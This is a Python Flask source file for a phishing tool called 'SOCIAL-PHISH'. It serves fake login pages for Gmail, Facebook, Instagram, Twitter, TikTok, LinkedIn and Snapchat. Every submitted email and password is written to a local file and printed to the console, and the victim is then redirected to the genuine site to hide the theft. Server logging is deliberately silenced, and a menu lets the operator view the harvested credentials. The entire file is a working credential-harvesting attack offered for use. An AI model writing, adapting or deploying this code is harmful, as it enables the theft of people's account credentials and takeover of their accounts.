import os
import time
import socket
import logging
import threading
from datetime import datetime

from flask import Flask, render_template, request, redirect
from colorama import Fore, Style, init

init(autoreset=True)

# ---------- Disable ALL Flask/Werkzeug logging ----------
logging.getLogger('werkzeug').disabled = True
logging.getLogger('werkzeug').setLevel(logging.CRITICAL)

app = Flask(__name__)
app.logger.disabled = True
app.logger.setLevel(logging.CRITICAL)

# ---------- Silence werkzeug request handler ----------
from werkzeug.serving import WSGIRequestHandler

class QuietHandler(WSGIRequestHandler):
    def log(self, *args, **kwargs):
        pass
    def log_request(self, *args, **kwargs):
        pass
    def log_error(self, *args, **kwargs):
        pass
    def log_message(self, *args, **kwargs):
        pass


# ---------- Config ----------
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATE_DIR = os.path.join(BASE_DIR, 'templates')
DATA_FILE = os.path.join(BASE_DIR, 'saved_data.txt')

OFFICIAL_URLS = {
    'Gmail':     'https://accounts.google.com/signin',
    'Facebook':  'https://www.facebook.com/login',
    'Instagram': 'https://www.instagram.com/accounts/login/',
    'Twitter':   'https://twitter.com/i/flow/login',
    'TikTok':    'https://www.tiktok.com/login',
    'LinkedIn':  'https://www.linkedin.com/login',
    'Snapchat':  'https://accounts.snapchat.com/accounts/login',
}

SITES = {
    '1': {'name': 'Gmail',     'route': 'gmail',     'color': Fore.RED},
    '2': {'name': 'Facebook',  'route': 'facebook',  'color': Fore.BLUE},
    '3': {'name': 'Instagram', 'route': 'instagram', 'color': Fore.MAGENTA},
    '4': {'name': 'Twitter',   'route': 'twitter',   'color': Fore.CYAN},
    '5': {'name': 'TikTok',    'route': 'tiktok',    'color': Fore.WHITE},
    '6': {'name': 'LinkedIn',  'route': 'linkedin',  'color': Fore.BLUE},
    '7': {'name': 'Snapchat',  'route': 'snapchat',  'color': Fore.YELLOW},
}


# ---------- Network helper ----------
def get_local_ip():
    """Get this PC's local network IP (e.g. 192.168.1.106)"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


# ---------- Save helper ----------
def save_credentials(site, email, password):
    line = f"[{datetime.now().strftime('%d/%m/%Y %I:%M:%S %p')}] [{site.upper()}] Email: {email} | Password: {password}\n"
    with open(DATA_FILE, 'a', encoding='utf-8') as f:
        f.write(line)

    color = Fore.GREEN
    print("\n" + color + "=" * 55 + Style.RESET_ALL)
    print(color + f"  NEW {site.upper()} LOGIN DATA" + Style.RESET_ALL)
    print(color + "=" * 55 + Style.RESET_ALL)
    print(Fore.CYAN + "  Email    : " + Style.RESET_ALL + str(email))
    print(Fore.CYAN + "  Password : " + Style.RESET_ALL + str(password))
    print(Fore.CYAN + "  Time     : " + Style.RESET_ALL + datetime.now().strftime('%d/%m/%Y, %I:%M:%S %p'))
    print(Fore.CYAN + "  Saved to : " + Style.RESET_ALL + DATA_FILE)
    print(color + "=" * 55 + Style.RESET_ALL + "\n")


# ---------- Routes ----------
@app.route('/')
def home():
    return "Server running."


@app.route('/gmail')
def gmail():
    return render_template('gmail.html')


@app.route('/facebook')
def facebook():
    return render_template('facebook.html')


@app.route('/instagram')
def instagram():
    return render_template('instagram.html')


@app.route('/twitter')
def twitter():
    return render_template('twitter.html')


@app.route('/tiktok')
def tiktok():
    return render_template('tiktok.html')


@app.route('/linkedin')
def linkedin():
    return render_template('linkedin.html')


@app.route('/snapchat')
def snapchat():
    return render_template('snapchat.html')


# ---------- Login POST handlers ----------
def handle_login(site):
    email = request.form.get('email')
    password = request.form.get('password')
    save_credentials(site, email, password)
    return redirect(OFFICIAL_URLS.get(site, '/'))


@app.route('/gmail/login', methods=['POST'])
def gmail_login():
    return handle_login('Gmail')


@app.route('/facebook/login', methods=['POST'])
def facebook_login():
    return handle_login('Facebook')


@app.route('/instagram/login', methods=['POST'])
def instagram_login():
    return handle_login('Instagram')


@app.route('/twitter/login', methods=['POST'])
def twitter_login():
    return handle_login('Twitter')


@app.route('/tiktok/login', methods=['POST'])
def tiktok_login():
    return handle_login('TikTok')


@app.route('/linkedin/login', methods=['POST'])
def linkedin_login():
    return handle_login('LinkedIn')


@app.route('/snapchat/login', methods=['POST'])
def snapchat_login():
    return handle_login('Snapchat')


# ---------- Server runner ----------
def start_server(route=None):
    local_ip = get_local_ip()
    pc_url = f"http://localhost:5000/{route}" if route else "http://localhost:5000"
    ph_url = f"http://{local_ip}:5000/{route}" if route else f"http://{local_ip}:5000"

    print(Fore.GREEN + "\n  Starting server..." + Style.RESET_ALL)
    print("  URL : " + Fore.CYAN + pc_url + Style.RESET_ALL)
    print("   URL : " + Fore.YELLOW + ph_url + Style.RESET_ALL)
    print()
    app.run(
        host='0.0.0.0',
        port=5000,
        debug=False,
        use_reloader=False,
        threaded=True,
        request_handler=QuietHandler,
    )


def run_server_blocking(route):
    server_thread = threading.Thread(target=start_server, args=(route,), daemon=True)
    server_thread.start()
    time.sleep(1.2)

    local_ip = get_local_ip()
    ph_url = f"http://{local_ip}:5000/{route}"

    print(Fore.GREEN + "-" * 55 + Style.RESET_ALL)
  
   
    print("  Press " + Fore.CYAN + "ENTER" + Style.RESET_ALL + " to stop the server and go back to menu.")
    print(Fore.GREEN + "-" * 55 + Style.RESET_ALL)

    try:
        input()
    except KeyboardInterrupt:
        pass

    print(Fore.RED + "\n  Stopping server..." + Style.RESET_ALL)
    os._exit(0)


# ---------- Tool UI ----------
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


def banner():
    print(Fore.CYAN + "=" * 25 + Style.RESET_ALL)
    print(Fore.CYAN + "        SOCIAL-PHISH " + Style.RESET_ALL)
    print(Fore.CYAN + "=" * 25 + Style.RESET_ALL)


def menu():
    print(Fore.YELLOW + "\n  Select an option:\n" + Style.RESET_ALL)
    for key, site in SITES.items():
        print(f"   {site['color']}[{key}] {site['name']}" + Style.RESET_ALL)
    print(Fore.YELLOW + "   [8] View saved data" + Style.RESET_ALL)
    print(Fore.YELLOW + "   [9] Clear saved data" + Style.RESET_ALL)
    print(Fore.RED + "   [0] Exit" + Style.RESET_ALL)
    print()


def view_saved_data():
    clear()
    banner()
    print(Fore.YELLOW + "\n  SAVED DATA\n" + Style.RESET_ALL)
    print("-" * 55)

    if not os.path.exists(DATA_FILE):
        print(Fore.RED + "  No saved data yet." + Style.RESET_ALL)
    else:
        with open(DATA_FILE, 'r', encoding='utf-8') as f:
            content = f.read().strip()
        if content:
            print(content)
        else:
            print(Fore.RED + "  File is empty." + Style.RESET_ALL)

    print("-" * 55)
    input(Fore.CYAN + "\n  Press ENTER to return to menu..." + Style.RESET_ALL)


def clear_saved_data():
    clear()
    banner()
    print(Fore.YELLOW + "\n  CLEAR SAVED DATA\n" + Style.RESET_ALL)

    if not os.path.exists(DATA_FILE):
        print(Fore.RED + "  No file to clear." + Style.RESET_ALL)
        input(Fore.CYAN + "\n  Press ENTER to return..." + Style.RESET_ALL)
        return

    confirm = input(Fore.RED + "  Are you sure? (y/n): " + Style.RESET_ALL).strip().lower()
    if confirm == 'y':
        open(DATA_FILE, 'w').close()
        print(Fore.GREEN + "\n  File cleared." + Style.RESET_ALL)
    else:
        print(Fore.YELLOW + "\n  Cancelled." + Style.RESET_ALL)
    input(Fore.CYAN + "\n  Press ENTER to return..." + Style.RESET_ALL)


def main():
    while True:
        clear()
        banner()
        menu()
        choice = input(Fore.CYAN + "  Enter your choice: " + Style.RESET_ALL).strip()

        if choice in SITES:
            clear()
            banner()
            route = SITES[choice]['route']
            run_server_blocking(route)
        elif choice == '8':
            view_saved_data()
        elif choice == '9':
            clear_saved_data()
        elif choice == '0':
            clear()
            print(Fore.GREEN + "\n  Goodbye!\n" + Style.RESET_ALL)
            break
        else:
            print(Fore.RED + "\n  [!] Invalid choice." + Style.RESET_ALL)
            input("  Press ENTER to continue...")


if __name__ == "__main__":
    main()